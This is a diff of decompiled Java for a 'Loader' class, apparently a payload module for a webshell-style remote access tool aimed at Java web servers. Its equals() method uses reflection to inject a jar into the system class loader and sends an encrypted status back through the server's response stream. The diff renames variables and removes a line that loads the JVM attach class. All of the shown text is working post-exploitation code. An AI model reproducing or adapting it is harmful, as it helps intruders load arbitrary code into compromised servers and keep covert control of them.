@@ -19,36 +19,35 @@ public class Loader {
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
-      boolean var15 = false;
+      boolean var14 = false;
 
       Object so;
       Method write;
       label77: {
          try {
-            var15 = true;
+            var14 = true;
             this.fillContext(obj);
             URL url = (new File(libPath)).toURI().toURL();
             URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
             Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
             add.setAccessible(true);
             add.invoke(urlClassLoader, url);
-            Class c = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
             result.put("status", "success");
-            var15 = false;
+            var14 = false;
             break label77;
-         } catch (Exception var19) {
+         } catch (Exception var18) {
             result.put("status", "fail");
-            result.put("msg", var19.getMessage());
-            var15 = false;
+            result.put("msg", var18.getMessage());
+            var14 = false;
          } finally {
-            if (var15) {
+            if (var14) {
                try {
                   so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                   write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
-               } catch (Exception var16) {
+               } catch (Exception var15) {
                }
 
             }
@@ -60,7 +59,7 @@ public class Loader {
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
-         } catch (Exception var17) {
+         } catch (Exception var16) {
          }
 
          return true;
@@ -72,7 +71,7 @@ public class Loader {
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
-      } catch (Exception var18) {
+      } catch (Exception var17) {
       }
 
       return true;
